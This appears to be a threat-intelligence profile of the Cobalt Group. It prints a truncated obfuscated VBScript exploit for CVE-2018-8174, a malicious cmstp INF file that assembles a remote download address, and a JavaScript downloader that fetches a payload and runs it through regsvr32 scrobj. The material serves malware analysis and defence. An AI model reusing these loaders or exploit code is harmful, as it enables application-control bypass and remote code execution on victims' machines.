# Cobalt Group

## Features

1. Exploit the Internet Explorer vulnerability triggered by RTF documents and embedded URL moniker objects (CVE-2018-8174). After triggering the embedded object, the HTML page containing the VBS exploited by the vulnerability will be downloaded and executed. Its HTML code is based on Github's public vulnerability exploit code.

```html
<!doctype html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="x-ua-compatible" content="IE=10">
<meta http-equiv="Expires" content="0">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-control" content="no-cache">
<meta http-equiv="Cache" content="no-cache">
</head>
<body>
<script language="vbscript">
Dim lIIl
Dim IIIlI(6),IllII(6)
Dim IllI
Dim IIllI(40)
Dim lIlIIl,lIIIll
Dim IlII
Dim llll,IIIIl
Dim llllIl,IlIIII
Dim ntAAA,vpaa
IlII=195948557
lIlIIl=Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")
lIIIll=Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")
IllI=195890093
Function IIIII(dnnnnn)
lIlII=0
IllllI=0
IIlIIl=0
```

2. Use the Cmstp program to bypass the application control policy of Windows. Cmstp can use the INF file as a parameter and install the service configuration file for remote access connection. It can use the malicious INF file as a parameter for downloading and executing remote code.

```info
[ version ]
Signature=$chicagos$
AdvancedINF=2.5
[ DefaultInstall_SingleUser ]  //Install single user by default
UnRegisterOCXs=KHkDBoaZoahhZK
[ KHkDBoaZoahhZK ]
%11%\%urmIgcSCJgGmuD_1%%urmIgcSCJgGmuD_2%%urmIgcSCJgGmuD_3%,NI,%BqWxxGj_0%%BqWxxGj_1%%BqWxxGj_2%%BqWxxGj_3%%BqWxxGj_4%%BqWxxGj_5%%BqWxxGj_6%%BqWxxGj_7%%BqWxxGj_8%%BqWxxGj_9%%BqWxxGj_10%%BqWxxGj_11%%BqWxxGj_12%%BqWxxGj_13%%
[ Strings ]
AppAct="SOFTWARE\Microsoft\Connection Manager"  //Application operation
urmIgeSCJgGmuD_2="r0"
urmIgcSCJgGmuD_1="sC"
urmIgcSCJgGmuD_3="bJ"
//Splice download address
BqWxxGj_e="ht"
BqWxxGj_1="tp"
BqWxxGj_2=":/"
BqWxxGj_3="/9"
BqWxxGj_4="5."
BqWxxGj_5="14"
BqWxxGj_6="2."
BqWxxGj_7="39"
BqWxxGj_8=".1"
BqWxxGj_9="09"
BqWxxGj_10="/a"
BqWxxGj_11="3."
BqWxxGj_12="tx"
BqWxxGj_13="t"
ServiceName=" "
ShortSvcName=" "
```

3. When downloading, a JavaScript will be used to download the final payload.

```JavaScript
function hit() {
       var x1;
       var Note;
       var Sp;
       var saveTo = ' ';
       var comm = ' ';
       var mLink = 'https://domain/version.txt';
       var xx1 ='regsvr32 /S /N /U /I:';
       saveTo = myEnv('APPDATA') + '\\';
       {
              var e11;
              try {
                   x1 = obj('WScript.Shell');
                   Note = x1.RegRead(xStore);
                   if (Note) {
	       if (Note.indexof(',') !== -1) {
                           Sp = Note.split(',');
                           saveTo += Sp[0] + '.txt';
                       } else {
	            saveTo += tExtra( );
	       }
	  } else {
	       saveTo += tExtra();
                  }
            } catch (_e11) {
	 e11 = _e11;
	 {
	        saveTo += tExtra( );
	 }
            }
        }
       var dq = '"';
       comm = xx1 + dq + saveTo + dq + ' sCrobJ';
       if (fexist(saveTo) === false) {
           if (pnow(mLink, saveTo) ===true) {
               if (xGo(comm) === true) {
	   return true;
               }
           }
      } else {
           if (xGo(comm) === true) {
               return true;
           }
      }
}
```
